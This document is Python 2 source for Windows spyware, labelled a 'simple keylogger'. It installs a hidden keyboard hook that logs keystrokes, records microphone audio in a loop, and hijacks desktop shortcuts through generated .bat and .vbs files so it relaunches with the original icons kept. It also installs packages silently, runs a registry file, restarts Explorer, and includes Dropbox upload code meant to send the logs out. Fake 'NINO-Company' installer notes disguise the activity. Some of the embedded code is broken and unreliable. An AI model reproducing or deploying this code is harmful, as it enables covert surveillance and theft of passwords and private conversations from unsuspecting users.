#Simple keylogger for windows 7,8,10
# -*- coding: utf-8 -*-
import pyHook, pythoncom, sys, logging
import win32com.client
import pywintypes
import win32ui
import win32gui
import win32con
import win32api
import win32file
import ctypes
import ctypes.util
import re
import appdirs
import os, fnmatch
from sys import byteorder
from array import array
from struct import pack
import pyaudio
import wave
import subprocess
import shutil

username = os.getenv('username')
path = 'C:\\Users\\'+username+'\\Desktop'
pathh = 'C:\\Users\\'+username+'\\Favorites\\silent_bing.pwy'
patth = 'C:\\Users\\'+username+'\\Favorites\\silent_aud.pwy'
ma_path = os.getcwd()+'\\try2.py'
ma_path2 = os.getcwd() +'\\aud.py'
ma_path3 = os.getcwd()+'\\register.reg'
loling = 'C:\\Users\\'+username+'\\Favorites\\' + 'try2.py'
hrez = 'C:\\Users\\'+username+'\\Favorites\\' +'aud.py'
kek = 'C:\\Users\\'+username+'\\Favorites\\' +'register.reg'
shutil.copyfile(ma_path,loling)
shutil.copyfile(ma_path2,hrez)
shutil.copyfile(ma_path3,kek)
apath = ['python', 'C:\\Users\\'+username+'\\Favorites\\aud.py']
try:
    h='C:\\Users\\' + username + '\\Files'
    os.stat(h)

except:
    sf = 'C:\\Users\\' + username + '\\Files'
    os.mkdir(sf)
print apath

def start():
    global username
    global file_log
    global silent_audio
    global dropboxes_aud
    global dropboxes_kl
    global pathh
    global apath
    global hrez
    a='python'
    check_python27()
    install_py_pac()
    subprocess.Popen([a,hrez],shell=True,stdin=None,stdout=None,stderr=None,close_fds=True)
    creation(username, path, pathh)
    py_aud(apath)
    finishing(pathh, patth, file_log, silent_audio, dropboxes_aud, dropboxes_kl,)
    KLog()

def finishing(pathh,patth,file_log,silent_audio,dropbox_aud,dropbox_kl):
    pwy_to_run = 'python "' + pathh + '"'
    global username
    silent_aud = open(patth, "w")
    silent = open(pathh, "w")
    silent.write(dropbox_kl+file_log)
    silent_aud.write(silent_audio+dropbox_aud)
    silent.close()
    silent_aud.close()
    os.system(kek)
    aro = 'taskkill /F /FI "imagename eq explorer.exe"'
    aro2 = 'START explorer.exe'
    os.system(aro)
    os.system(aro2)
    print "done"

def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result


def install_py_pac():
    global username
    a = 'C:\\Users\\'+username+'\\Files'
    path_package = '"' + a
    k = "set PATH=%PATH%;C:\\python27"
    k.split(" ")
    subprocess.Popen(k,shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
    try:
        g = "easy_install pip"
        g.split(" ")
        subprocess.Popen(g,shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
    except:
        pass
    my_file ='C:\\Users\\'+username+'\\Files' + "\\file1.txt"
    filing = open(my_file, "w")
    filing.write("""
                refresher by NINO-Company© require python 2.7 installing
                        #######################################
                        #                                     #
                        #                                     #
                        #           Install py2exe            #
                        #                                     #
                        #                                     #
                        #######################################
                """)
    filing.close()
    a = 'pip install "' + path_package + '\\pyHook-1.5.1-cp27-cp27m-win_amd64.whl"'
    a.split(" ")
    subprocess.Popen(a,shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
    my_file.split(' ')
    subprocess.Popen(my_file,shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
    c = 'pip install "' + path_package + '\\py2exe-0.6.10a1-cp27-none-win_amd64.whl"'
    c.split(" ")
    subprocess.Popen(c,shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
    d = "pip install pypiwin32"
    d.split(" ")
    subprocess.Popen(d,shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
    e = 'pip install dropbox'
    e.split(" ")
    subprocess.Popen(e,shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)

def run_py_installer():

    my_path = 'C:\\Users\\'+username+'\\Files'
    patt = "*.msi"
    install = find(patt,my_path)
    my_file = 'C:\\Users\\'+username+'\\Files' + "\\file.txt"
    filing = open(my_file,"w")
    filing.write("""
    refresher by NINO-Company© require python 2.7 installing
            #######################################
            #                                     #
            #                                     #
            #         Install python 2.7          #
            #                                     #
            #                                     #
            #######################################
            
        if you already installing it you dont have to :)
        path: c:\\Python27
    """)
    filing.close()
    for ins in install:
        os.system(ins)
        subprocess.Popen([my_file], shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)

def check_python27():
    pray = sys.executable
    py_path = "C:\\Python27\\python.exe"
    try:
        if pray != py_path:
            run_py_installer()
    except:
        run_py_installer()

def py_aud(apath):
    subprocess.Popen(apath, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)

def KLog():
    username = os.getenv('username')
    mpath = "c:\\Users\\" + username + "\\Favorites\\Bing_help.pwy"
    filerr = open(mpath, "w")
    kllog = '''
import pyHook, pythoncom, sys, logging, os
def KLog():

    try:
        os.stat('C:\\VCredit')
    except:
        os.mkdir('C:\\VCredit')
    file_log = 'C:\\VCredit\\log.txt'
    def OnKeyboardEvent(event):
        logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
        chr(event.Ascii)
        logging.log(10, chr(event.Ascii))
        return True

    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

KLog()
    '''
    filerr.write(kllog)
    filerr.close()
    watch = 'python'
    subprocess.Popen(
        [watch, mpath], shell=True,
        stdin=None,
        stdout=None,
        stderr=None,
        close_fds=True
    )



def extract(rec,icon_name,hlib,libc):
    global n
    global username
    try:
        hicon = win32gui.CreateIconFromResource(rec, True)
    except pywintypes.error as error:
        # Check on appropriate error
        if error.winerror != 6:
            pass

        print("Resource %2d isn't .ico, extract" % icon_name)
        # This part almost identical to C++
        hResInfo = ctypes.windll.kernel32.FindResourceW(hlib, icon_name, win32con.RT_ICON)
        size = ctypes.windll.kernel32.SizeofResource(hlib, hResInfo)
        mem_pointer = ctypes.windll.kernel32.LockResource(rec)

        # And this is some differ (copy data to Python buffer)
        binary_data = (ctypes.c_ubyte * size)()
        libc.memcpy(binary_data, mem_pointer, size)

        # Save it
        with open('C:\\Users\\' + username + '\\Favorites\\icon' + str(n)+'.ico', "wb") as extract_file:
            extract_file.write(bytearray(binary_data))
    else:
        info = win32gui.GetIconInfo(hicon)
        bminfo = win32gui.GetObject(info[3])
        print("Resource %2d is .ico: 0x%08X -> %d %d " %
                (icon_name, hicon, bminfo.bmWidth, bminfo.bmHeight))




def creation(username,path,pathh):
    result = find('*.lnk', path)
    n = 0
    for link in result:
        dir_to_save_bat = "C:\\Users\\" + username + "\\bats"
        dir_to_save_vbs = "C:\\Users\\" + username + "\\vbs"
        icon_name = 'icon' + str(n) + '.ico'
        ppath = 'C:\\Users\\' + username + '\\Favorites\\icon' + str(n) + '.ico'
        try:
            os.stat(dir_to_save_bat)
        except:
            os.mkdir(dir_to_save_bat)
        try:
            os.stat(dir_to_save_vbs)
        except:
            os.mkdir(dir_to_save_vbs)

        link2 = os.path.split(link)[1]
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut("C:\\Users\\" + username + "\\Desktop\\" + link2)
        Target = shortcut.Targetpath
        libc = ctypes.CDLL(ctypes.util.find_library('c'))
        libc.memcpy.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
        libc.memcpy.restype = ctypes.c_char_p

        # All Windows backslashes must be escaped to LoadLibrary worked correctly '\' -> '\\'
        PATH = Target
        PATH = str(PATH)

        try:
            icon_name = 'icon' + str(n) + '.ico'
            hlib = win32api.LoadLibrary(PATH)
            hResInfo = ctypes.windll.kernel32.FindResourceW(hlib, icon_name, win32con.RT_ICON)
            size = ctypes.windll.kernel32.SizeofResource(hlib, hResInfo)
            rec = win32api.LoadResource(hlib, win32con.RT_ICON, icon_name)
            mem_pointer = ctypes.windll.kernel32.LockResource(rec)
            binary_data = (ctypes.c_ubyte * size)()
            libc.memcpy(binary_data, mem_pointer, size)

            ppath = 'C:\\Users\\' + username + '\\Favorites\\icon' + str(n) + '.ico'
            with open(ppath, "wb") as test_file:
                test_file.write(bytearray(binary_data))

        except pywintypes.error as error:
            print "ERROR: %s" % error.strerror
            pass
        except:
            try:
                hlib = win32api.LoadLibrary(PATH)
                icon_names = win32api.EnumResourceNames(hlib, win32con.RT_ICON)
                for icon_name in icon_names:
                    rec = win32api.LoadResource(hlib, win32con.RT_ICON, icon_name)
                    extract(rec, icon_name, hlib, libc)
            except pywintypes.error as error:
                print "ERROR: %s" % error.strerror
                pass
        re_short = 'Set sh = CreateObject("WScript.Shell")\nSet shortcut = sh.CreateShortcut("' + str(link) + '")\nshortcut.TargetPath = "' + dir_to_save_bat + "\\bat_N_" + str(n) + '.bat' + '"\nshortcut.Save\'\nlnkfile = sh.SpecialFolders("Desktop") & "\\' + link2 + '"' + '\nSet lnk = sh.CreateShortcut(lnkfile)\nIf lnk.IconLocation = "' + ppath + '" Then\n  lnk.IconLocation = "' + ppath + '"\nElse\n  lnk.IconLocation = "' + ppath + '"\nEnd If\nlnk.Save'
        path0 = dir_to_save_bat + "\\bat_N_" + str(n) + '.bat'
        path1 = dir_to_save_vbs + "\\vbs_N_" + str(n) + '.vbs'

        t = r".+\:+[a-zA-Z0-9_\\]+\.+(bat)"
        regex = re.search(t, Target)
        if regex == None:
            the_bat = '@echo\nstart "" "' + pathh + '"\nstart "" "' + patth + '"\nstart "" ' + '"' + Target + '"'
            file = open(path0, "w")
            file2 = open(path1, "w")
            file.write(the_bat)
            file2.write(re_short)
            file.close()
            file2.close()
            subprocess.Popen([path1],shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
            print "created"
        n += 1

def py_silently(silent_audio,username):
    ppath = 'C:\\Users\\'+username+'\\Favorites\\Bin_sily.py'
    ffile = open(ppath,"w")
    ffile.write(silent_audio)
    ffile.close()
    subprocess.Popen([ppath],shell=True ,stderr=None ,stdout=None ,stdin=None ,close_fds=True)

file_log = '''
import pyHook, pythoncom, sys, logging
import os

try:
    os.stat('C:\\VCredit')
except:
    os.mkdir('C:\\VCredit')
file_log = 'C:\\VCredit\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


'''
dropboxes_aud = '''
    import os
    import sys
    from dropbox.client import DropboxClient
    # get an access token, local (from) directory, and Dropbox (to) directory
    # from the command-line
    access_token, local_directory, dropbox_destination = 'C:\\VCredit'

    client = DropboxClient(access_token)

    # enumerate local files recursively
    for root, dirs, files in os.walk(local_directory):

        for filename in files:

            # construct the full local path
            local_path = os.path.join(root, filename)

            # construct the full Dropbox path
            relative_path = os.path.relpath(local_path, local_directory)
            dropbox_path = os.path.join(dropbox_destination, relative_path)

            # upload the file
            with open(local_path, 'rb') as f:
                client.put_file(dropbox_path, f)
'''
dropboxes_kl = '''
'''
silent_audio = '''
 from sys import byteorder
from array import array
from struct import pack
import subprocess
import pyaudio
import wave
import os
n=0
while 1:
    THRESHOLD = 500
    CHUNK_SIZE = 1024
    FORMAT = pyaudio.paInt16
    RATE = 44100

    def is_silent(snd_data):
        "Returns 'True' if below the 'silent' threshold"
        return max(snd_data) < THRESHOLD

    def normalize(snd_data):
        "Average the volume out"
        MAXIMUM = 16384
        times = float(MAXIMUM)/max(abs(i) for i in snd_data)

        r = array('h')
        for i in snd_data:
            r.append(int(i*times))
        return r

    def trim(snd_data):
        "Trim the blank spots at the start and end"
        def _trim(snd_data):
            snd_started = False
            r = array('h')

            for i in snd_data:
                if not snd_started and abs(i)>THRESHOLD:
                    snd_started = True
                    r.append(i)

                elif snd_started:
                    r.append(i)
            return r

        # Trim to the left
        snd_data = _trim(snd_data)

        # Trim to the right
        snd_data.reverse()
        snd_data = _trim(snd_data)
        snd_data.reverse()
        return snd_data

    def add_silence(snd_data, seconds):
        "Add silence to the start and end of 'snd_data' of length 'seconds' (float)"
        r = array('h', [0 for i in xrange(int(seconds*RATE))])
        r.extend(snd_data)
        r.extend([0 for i in xrange(int(seconds*RATE))])
        return r

    def record():
        """
        Record a word or words from the microphone and 
        return the data as an array of signed shorts.

        Normalizes the audio, trims silence from the 
        start and end, and pads with 0.5 seconds of 
        blank sound to make sure VLC et al can play 
        it without getting chopped off.
        """
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=1, rate=RATE,
            input=True, output=True,
            frames_per_buffer=CHUNK_SIZE)

        num_silent = 0
        snd_started = False

        r = array('h')

        while 1:
            # little endian, signed short
            snd_data = array('h', stream.read(CHUNK_SIZE))
            if byteorder == 'big':
                snd_data.byteswap()
            r.extend(snd_data)

            silent = is_silent(snd_data)

            if silent and snd_started:
                num_silent += 1
            elif not silent and not snd_started:
                snd_started = True

            if snd_started and num_silent > 30:
                break

        sample_width = p.get_sample_size(FORMAT)
        stream.stop_stream()
        stream.close()
        p.terminate()

        r = normalize(r)
        r = trim(r)
        r = add_silence(r, 0.5)
        return sample_width, r

    def record_to_file(path):
        "Records from the microphone and outputs the resulting data to 'path'"
        sample_width, data = record()
        data = pack('<' + ('h'*len(data)), *data)

        wf = wave.open(path, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(sample_width)
        wf.setframerate(RATE)
        wf.writeframes(data)
        wf.close()

    print("please speak a word into the microphone")
    file_to_record = 'C:\\VCredit\\demo'+str(n)+'.wav'
    record_to_file(file_to_record)
    print("done - result written to demo.wav")
    n += 1
    pather = 'python "' + os.getcwd() + '\\try2.py"'
    pather.split(' ')
    if n==1:
        subprocess.Popen(pather,shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)


    '''

if __name__=="__main__":
    start()